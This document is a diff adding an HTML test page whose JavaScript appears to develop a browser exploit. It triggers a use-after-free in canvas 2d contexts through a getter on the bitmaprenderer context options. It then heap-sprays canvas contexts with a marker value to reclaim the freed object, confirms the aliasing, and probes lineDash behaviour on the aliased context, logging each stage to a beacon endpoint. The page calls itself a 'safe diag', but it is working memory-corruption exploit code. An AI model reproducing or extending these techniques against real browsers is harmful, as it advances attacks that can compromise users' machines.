@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V927B</title></head>
+<body><pre id="out">V927B — lineDash on live alias (safe diag, B-session)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V927B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,500))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+function eqArr(a,b){
+  if(!a||!b||a.length!==b.length) return false;
+  for(var i=0;i<a.length;i++){ if(a[i]!==b[i]) return false; }
+  return true;
+}
+
+var P=new URLSearchParams(location.search);
+var NSAVES=+(P.get('saves')||'32');
+var NSPRAY=+(P.get('spray')||'300');
+var MARKER=+(P.get('marker')||'7777.77');
+
+bk('BOOT','saves='+NSAVES+',spray='+NSPRAY+',marker='+MARKER);
+say('BOOT');
+
+/* UAF (V573 pattern) */
+var innerCtx=null;
+(function(){
+  var c=document.createElement('canvas'); c.width=1; c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    var ctx=c.getContext('2d'); innerCtx=ctx;
+    for(var s=0;s<NSAVES;s++) ctx.save();
+    ctx.lineWidth=1.0; return true;
+  }});
+  try{ c.getContext('bitmaprenderer',d); }catch(e){ bk('TRIG-ERR',e.message); }
+})();
+bk('POST-UAF','ctx='+(innerCtx?'OK':'NULL'));
+if(!innerCtx){ bk('FAIL','no-inner'); say('FAIL'); }
+
+/* same-type spray (do not touch innerCtx before) */
+var sprayCtxs=[];
+for(var i=0;i<NSPRAY;i++){
+  var sc=document.createElement('canvas'); sc.width=1; sc.height=1;
+  var sctx=sc.getContext('2d');
+  if(sctx){ sctx.lineWidth=MARKER; sprayCtxs.push(sctx); }
+}
+bk('SPRAY','n='+sprayCtxs.length);
+
+/* confirm alias */
+var lwR, aliasCtx=null, aliasIdx=-1, errR;
+try { lwR=innerCtx.lineWidth; } catch(e){ errR='lw:'+e.message; }
+if(errR){ bk('READ','ERR:'+String(errR).slice(0,200)); say('READ ERR '+errR); }
+else {
+  bk('READ','lw='+lwR);
+  if(lwR===MARKER){
+    bk('RECLAIM','CONFIRMED');
+    try{ innerCtx.lineWidth=9999.99; }catch(e){}
+    for(var i=0;i<sprayCtxs.length;i++){
+      try{ if(sprayCtxs[i].lineWidth===9999.99){ aliasCtx=sprayCtxs[i]; aliasIdx=i; break; } }catch(e){}
+    }
+    bk('ALIAS','idx='+aliasIdx+',found='+(aliasCtx?'1':'0'));
+    say('ALIAS idx='+aliasIdx);
+  } else {
+    bk('RECLAIM','NO-marker lw='+lwR);
+    say('NO alias marker, lw='+lwR);
+  }
+}
+
+/* SAFE lineDash diagnostics on LIVE alias (prefer spray ctx = live valid object) */
+var live = aliasCtx || innerCtx;
+function testDash(name, seq){
+  try{
+    live.setLineDash(seq);
+    var got = live.getLineDash();
+    var ok = eqArr(seq, got);
+    var info = name+'|set=['+seq.join(',')+']|get=['+Array.prototype.join.call(got,',')+']|len='+got.length+'|ok='+ok;
+    bk('DASH', info);
+    say('DASH '+name+' ok='+ok+' len='+got.length+' got=['+Array.prototype.join.call(got,',')+']');
+    return {ok:ok, got:got};
+  }catch(e){ bk('DASH-ERR', name+'|'+e.name+':'+String(e.message).slice(0,120)); say('DASH-ERR '+name+' '+e.message); return null; }
+}
+
+if(live){
+  bk('LD-START','target='+(aliasCtx?'alias-spray#'+aliasIdx:'innerCtx'));
+  testDash('empty', []);
+  testDash('two', [5, 15]);
+  testDash('odd', [5, 15, 25]);       /* odd -> duplicated by spec */
+  testDash('four', [1,2,3,4]);
+  testDash('eight', [1,2,3,4,5,6,7,8]);
+  testDash('f64', [1.5, 2.25, 3.125, 4.0625]);
+  /* alias cross-check: set via one, read via other */
+  try{
+    if(aliasCtx && innerCtx){
+      innerCtx.setLineDash([9,8,7,6]);
+      var g1 = innerCtx.getLineDash();
+      var g2 = aliasCtx.getLineDash();
+      bk('XCHK','inner=['+Array.prototype.join.call(g1,',')+']|alias=['+Array.prototype.join.call(g2,',')+']|eq='+eqArr(g1,g2));
+      say('XCHK eq='+eqArr(g1,g2));
+    }
+  }catch(e){ bk('XCHK-ERR', e.message); }
+  /* restore */
+  try{ live.setLineDash([]); }catch(e){}
+  bk('LD-DONE','complete');
+} else {
+  bk('LD-SKIP','no-live-ctx');
+}
+
+bk('DONE','complete');
+say('\nV927B complete.');
+</script>
+</body></html>
